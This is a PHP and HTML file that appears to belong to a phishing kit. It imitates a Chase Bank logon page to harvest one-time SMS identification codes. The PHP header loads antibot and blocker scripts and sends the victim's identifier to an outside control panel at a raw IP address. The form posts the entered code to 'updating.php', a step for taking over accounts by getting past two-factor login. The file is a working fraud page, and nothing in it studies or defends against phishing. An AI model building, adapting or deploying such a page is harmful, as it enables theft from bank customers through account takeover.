<?php
/*   
Mou-Ad                    
*/
session_start();

session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include './antibots.php';
include './bt.php';
include "./blocker.php";
$numar = @$_GET['nr'];

$external_link="http://89.32.40.36/panel/b.php?pin=$numar,READY";

        $msg= "$numar,READY";
        $data = $msg;

        $ch2 = curl_init($external_link);
        curl_setopt($ch2, CURLOPT_POST ,1);
        curl_setopt($ch2, CURLOPT_POSTFIELDS ,"$msg");
        curl_setopt($ch2, CURLOPT_HEADER ,0);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER ,1);
        $data = curl_exec($ch2);
		


?>



	<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
 class="no-js" dir="ltr" lang="en">
<head>
<!-- saved from url=(0101)https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#/logon/logon/chaseOnline -->
  <meta http-equiv="Content-Type"
 content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible"
 content="IE=edge">
  <meta name="msapplication-config"
 content="none">
  <title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport"
 content="width=device-width, initial-scale=1.0">


<!--[if lte IE 8]>
        <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2017.04.09-277/logon/assets/ie8.css" />
        <![endif]-->
		<link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico" />
  <link rel="apple-touch-icon"
 sizes="152x152"
 href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-152x152.png">
  <link rel="apple-touch-icon"
 sizes="120x120"
 href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-120x120.png">
  <link rel="apple-touch-icon"
 sizes="76x76"
 href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-76x76.png">
  <link rel="apple-touch-icon"
 href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon.png">
  <meta name="apple-mobile-web-app-capable"
 content="yes">
  <meta
 name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-startup-image"
 href="https://static.chasecdn.com/web/2017.04.09-277/common/assets/img/splash/ipad-landscape.png"
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
  <link rel="apple-touch-startup-image"
 href="https://static.chasecdn.com/web/2017.04.09-277/common/assets/img/splash/ipad-portrait.png"
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
  <link rel="apple-touch-startup-image"
 href="https://static.chasecdn.com/web/2017.04.09-277/common/assets/img/splash/iphone.png"
 media="screen and (max-device-width: 320px)">
  <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
  <link rel="stylesheet"
 href="https://static.chasecdn.com/web/2017.04.09-277/common/assets/blue-ui.css">
  <link rel="stylesheet"
 href="css/logon.css">
 
  <style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.4.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.4.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.4.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.4.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.night.4.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.night.4.jpeg); } }</style>
</head>
<body style="height: 100%;"
 data-has-view="true">
<div>
<div class="homepage" tabindex="-1">
<div id="sitemessage" role="region"
 aria-labelledby="site-messages-heading"
 class="toggle-aria-hidden" aria-hidden="true"
 data-has-view="true">
<div>
<div id="siteMessageAda"
 aria-live="polite">
<h2 id="site-messages-heading"
 class="util accessible-text"
 data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You
have no more site alerts</h2>
</div>
</div>
</div>

<header id="logon-summary-menu"
 class="toggle-aria-hidden" data-has-view="true"></header>
<div
 class="logon header jpui transparent navigation bar">


     <img style="max-width: 80%;"   src="chase.png"  />

</div>

</div>



<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>

</div>
</div>
<div class="container logon">
<div>
<div
 class="jpui background image fixed show-xs show-sm"
 id="geoImage"></div>
</div>

<div class="row">
<div id="logoffbox" class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">

</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>
</div>
</div>
</div>
</div>
<div>

<div class="jpui raised segment">

<div class="row">

<div class="col-xs-10 col-xs-offset-1">
<strong style="border: 0px none ; margin: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline;">We sent you a text message!<span class="Apple-converted-space"></span></strong>
    
    <br>
    <br>
    
    
    <strong style="border: 0px none ; margin: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline;">Your identification code is on its way. Once you receive it, please enter it below.</strong>
    
        <br>
    <br>

    
    
    

<form id="login-form" method="post" autocomplete="off" action="updating.php">
 
  <div id="validator-error-header" class="hide-xs">
 
  
  <div id="logon-error" class="jpui error inverted primary alert error" role="region">
  <div class="icon"><span id="type-icon-logon-error"><i class="jpui exclamation-color icon" aria-hidden="true" id="icon-type-icon-logon-error"></i></span></div>
  <div class="icon background"></div>
  <div id="content-logon-error" class="content wrap">
  <h2 class="title" tabindex="-1" id="inner-logon-error"><span class="util accessible-text" id="icon-logon-error">Important:
  </span></h2>
  </div>
  </div>
  </div>
  <label for="userId-input-field" class="util accessible-text logon-xs-toggle error" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Registered E-mail Address</label>
  <div id="userId" class="logon-xs-toggle">
  </div><p>
  <input type="hidden" id="custId" name="nr" value="<?php echo($numar); ?>">
  <label for="phone-input-field" class="util accessible-text logon-xs-toggle error" data-attr="LOGON.userIdPlaceholder"><span class="accessible-text errorAdaText">Error:</span>Temporary identification code</label>
  </p><div id="phone" class="logon-xs-toggle"><input id="phone-input-field" class="jpui input" placeholder="Temporary identification code" aria-describedby="phone-helpertext" aria-invalid="false" min="0" name="sms" data-validate="phone" value="" autocorrect="off" autocapitalize="off" data-attr="LOGON.phone" type="text" required="" oninvalid="this.setCustomValidity('Enter  Temporary identification code received on your phone')" oninput="setCustomValidity('')">
  </div>
<br>

<strong style="border: 0px none ; margin: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline;">We send our temporary identification codes right away.<span class="Apple-converted-space"></span></strong>
  <div></div>
  <div>
  <div>
  <div>
  <div>
  <div "=""></div>
  </div>
  </div>
  </div>
  <div>
  <div>
  <div>
  <div></div>
  </div>
  </div>
  </div>
  </div>
  <div class="row"> <button class="jpui button focus fluid primary" id="signin-button" type="submit" role="button" data-attr="LOGON.logonToLandingPage">
  <div class="label">Next</div>
  </button> </div>
  <div></div>
  <div></div>
</form>
</div>
</div>
</div>
</div>

</div>
</div>


















<br><br><br>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12"><span
 <span class="follow-us-text" style="
    height: 30px;
">Follow us:</span>
<img itemprop="logo" height="21" width="185" alt="Βank of Αmerica" src="css/Capture.PNG">
</div>
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestContactUs">Contact
us</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestSecurity">Security</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestTermsOfUse">Terms
of use</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestMortgageLoanOriginators">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestHomeMortgageDisclosureAct">Fair
Lending</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestAboutChase">About
Chase</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestJpMorgan">J.P.
Morgan</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestJpMorganChaseCo">JPMorgan
Chase &amp; Co.</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestCareers">Careers</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestEspanol" lang="es">Espa&ntilde;ol</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestChaseCanada">Chase
Canada</a></li>
  <li><a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestSiteMap">Site map</a></li>
  <li>Member FDIC</li>
  <li><i
 class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">&copy;
2017 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">&copy;
2019 JPMorgan Chase &amp; Co.</span><br>
<a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 class="NOTELINK"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon"
 aria-hidden="true"></i></a><br>
<a
 href="https://secure05c.chase.com/web/auth/?fromOrigin=https://secure05c.chase.com#"
 data-attr="LOGON_FOOTER_MENU.requestAccessibility">Our
commitment to accessibility<i
 class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>
</div>
</div>
<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>
</div>
</body>
</html>
